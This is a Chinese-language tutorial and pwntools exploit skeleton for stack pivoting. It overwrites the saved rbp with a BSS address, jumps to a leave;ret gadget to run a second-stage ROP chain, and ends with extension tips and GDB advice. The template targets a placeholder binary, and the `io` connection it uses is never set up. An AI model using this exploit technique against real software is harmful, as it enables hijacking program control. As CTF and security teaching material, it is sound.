
# 模板概览与入口

本模板提供了**栈迁移 (Stack Pivoting)** 攻击的 `pwntools` EXP 骨架。当栈溢出漏洞存在但可利用的空间不足以容纳完整的 ROP 链时，此技术通过劫持栈指针 (`rsp`) 到一个更大的、可控的内存区域（如 BSS 段或堆块），从而在该新栈上执行后续的 ROP 攻击。

此模板的核心是利用 `leave; ret` gadget，通过两阶段攻击实现：第一阶段写入 ROP 链到新栈并触发迁移，第二阶段在新栈上执行 ROP 链。

**核心入口代码片段**：

```python
from pwn import *

# --- 环境设置 ---
context.arch = 'amd64'
elf = ELF('./your_binary')

# --- 关键信息 ---
offset = 128  # 栈溢出偏移
rop = ROP(elf)
leave_ret = rop.find_gadget(['leave', 'ret'])[0]

# 选择一个可写的、地址已知的大内存区域作为新栈
# 如果 PIE 关闭，BSS 段是很好的选择
new_stack_addr = elf.bss() + 0x100

# --- 第一阶段：布置新栈并触发迁移 ---

# 1.1 在新栈上布置第二阶段的 ROP 链 (例如，一个 ret2libc)
log.info(f"Preparing new stack at {hex(new_stack_addr)}...")
rop_on_new_stack = ROP(elf)
# ... 在这里构造一个完整的 ROP 链，例如:
# rop_on_new_stack.puts(elf.got['puts'])
# rop_on_new_stack.main()

# 利用程序中的 read 或其他写入函数，将 ROP 链写入 new_stack_addr
# 假设程序有一个 read(0, bss_addr, size) 的功能
# read_to_bss_payload = ...
# io.send(read_to_bss_payload)
# time.sleep(0.1)
io.send(rop_on_new_stack.chain()) # 直接发送 ROP 链数据

# 1.2 触发栈迁移
log.info("Triggering stack pivot...")
payload_pivot = flat([
    b'A' * offset,         # 填充
    new_stack_addr,      # 覆盖 saved rbp，使其指向新栈地址
    leave_ret            # 覆盖返回地址，执行 leave; ret
])

io.sendlineafter(b'> ', payload_pivot)

# --- 第二阶段：在新栈上执行 ---
# 此时程序会自动执行新栈上的 ROP 链

# ... 后续交互，例如接收泄露的地址 ...

io.interactive()
```

# 攻击关键点速查

- **重要钩子 (Key Hooks)**
  - **`leave; ret` gadget**: 栈迁移的核心。`leave` 指令等价于 `mov rsp, rbp; pop rbp`。通过控制 `rbp` 的值，即可控制 `rsp`。
  - **可写内存区域**: `.bss` 段、通过漏洞申请的堆块等。这个区域的地址必须是已知的（或可通过泄露获得），并且必须有足够的空间来存放完整的 ROP 链。
  - **写入函数**: 程序中必须存在一个可以将我们的 ROP 链写入上述可写内存区域的函数，如 `read`, `gets` 等。

- **关键结构体 (Key Structures)**
  - **迁移 Payload**: `[Padding] + [New Stack Address] + [leave_ret_gadget_addr]`。这是触发迁移的关键，其目的是将 `rbp` 设置为新栈地址，并将 `rip` 指向 `leave; ret`。
  - **新栈 (Fake Stack)**: 存放在 BSS 或堆上的一段数据，其内容就是一个完整的 ROP 链。它的布局与普通 ROP 链完全相同。

- **主要攻击面 (Main Attack Surfaces)**
  - **`saved rbp`**: 在栈溢出中，这个紧邻返回地址的 `rbp` 备份是 `leave` 指令的直接操作对象，是实现栈迁移的入口点。
  - **返回地址**: 用于跳转到 `leave; ret` gadget。

# 迭代扩展思路

- **从骨架到稳定 EXP 的演进**
  1.  **精确地址和偏移**:
      -   使用 `pwntools.cyclic` 精确计算覆盖 `rbp` 和返回地址的偏移。
      -   确保 `new_stack_addr` 有足够的写权限并且地址正确。如果 PIE 开启，需要先泄露程序的基址，然后计算出 BSS 段的真实地址。
  2.  **处理时序问题**: 必须保证在触发迁移的 payload 发送**之前**，新栈上的 ROP 链已经被完全写入。这通常需要利用程序逻辑，找到一个先写内存、后触发溢出的调用顺序。如果程序功能有限，可能需要在一个 payload 中同时完成写入和迁移，这需要更精巧的构造。
  3.  **选择合适的写入函数**: 如果没有 `read`，可以利用 `strcpy`, `scanf` 等，但要注意坏字符问题。例如，`new_stack_addr` 如果包含 `\x00`，`strcpy` 就会截断。
  4.  **无 `leave; ret` 的情况**:
      -   可以寻找其他能够控制 `rsp` 的 gadget 组合，例如：
        ```
        pop rbp; ret;  // 用来控制 rbp
        mov rsp, rbp; ret; // 进行迁移
        ```
      -   这种组合虽然更复杂，但原理是相通的。
  5.  **结合信息泄露**: 在 PIE 和 ASLR 都开启的环境下，栈迁移通常是组合拳的一部分。
      -   **第一步**: 利用一个初步的、短的 ROP 链或格式化字符串漏洞，泄露程序基址和 libc 基址。
      -   **第二步**: 计算出 `.bss` 段的真实地址和 `leave; ret` gadget 的真实地址。
      -   **第三步**: 使用泄露的信息，执行模板中的两阶段攻击，将一个完整的 `ret2libc` ROP 链写入 `.bss` 段，然后触发栈迁移去执行它。
  6.  **调试技巧**: 在 GDB 中，在 `leave; ret` gadget 处和新 ROP 链的第一个 gadget 处下断点。单步执行 `leave` 指令 (`ni`)，观察 `rsp` 和 `rbp` 寄存器的变化是否符合预期，这是验证迁移是否成功的关键。
